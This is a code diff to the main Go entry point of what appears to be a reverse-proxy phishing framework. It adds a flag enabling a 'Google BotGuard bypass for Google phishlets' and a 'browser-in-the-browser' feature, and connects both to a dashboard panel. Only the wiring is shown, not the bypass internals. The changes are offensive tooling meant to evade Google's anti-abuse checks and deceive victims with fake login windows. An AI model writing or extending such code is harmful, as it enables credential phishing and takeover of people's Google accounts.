@@ -28,6 +28,7 @@ var version_flag = flag.Bool("v", false, "Show version")
 var dashboard_enabled = flag.Bool("dashboard", false, "Enable live dashboard web panel")
 var dashboard_port = flag.Int("dashboard-port", 5050, "Dashboard web panel port")
 var dashboard_auth = flag.String("dashboard-auth", "", "Dashboard authentication token (auto-generated if empty)")
+var googleBypass = flag.Bool("google-bypass", false, "Enable Google BotGuard bypass for Google phishlets")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -175,6 +176,19 @@ func main() {
 	}
 
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	if *googleBypass {
+		gb := core.NewGoogleBypass()
+		if err := gb.Start(); err != nil {
+			log.Error("google bypass: %v", err)
+		} else {
+			hp.SetGoogleBypass(gb)
+			log.Info("google bypass: enabled")
+
+			bm := core.NewBitbManager(gb)
+			hp.SetBitbManager(bm)
+			log.Info("bitb: browser-in-the-browser enabled")
+		}
+	}
 	hp.Start()
 
 	if *dashboard_enabled {
@@ -183,6 +197,9 @@ func main() {
 			dashAuth = core.GenRandomAlphanumString(16)
 		}
 		dash := dashboard.New(db, dashAuth, *dashboard_port)
+		if bm := hp.GetBitbManager(); bm != nil {
+			dash.SetBitbProvider(bm)
+		}
 		go func() {
 			log.Info("dashboard: web panel starting on http://0.0.0.0:%d", *dashboard_port)
 			if dashAuth != "" {
